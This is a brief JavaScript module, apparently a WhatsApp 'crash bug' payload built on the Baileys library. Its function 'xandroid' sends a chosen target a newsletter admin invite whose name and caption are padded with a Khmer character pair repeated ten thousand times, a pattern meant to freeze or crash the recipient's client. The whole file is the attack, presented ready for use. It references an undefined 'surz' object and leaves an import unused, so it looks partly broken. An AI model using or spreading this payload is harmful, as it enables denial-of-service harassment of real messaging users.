import { generateWAMessageFromContent } from "@whiskeysockets/baileys";

export default async function xandroid(target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363294574934046@newsletter",
      newsletterName: "⎋𝐅𝐢̸̷̷̷̋͜͢͜͢͠͡͡𝐍𝐈𝐗͜͢-‣" + "ោ៝".repeat(10000),
      caption: "⎋𝐅𝐢̸̷̷̷̋͜͢͜͢͠͡͡𝐍𝐈𝐗͜͢-‣" + "ោ៝".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await surz.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}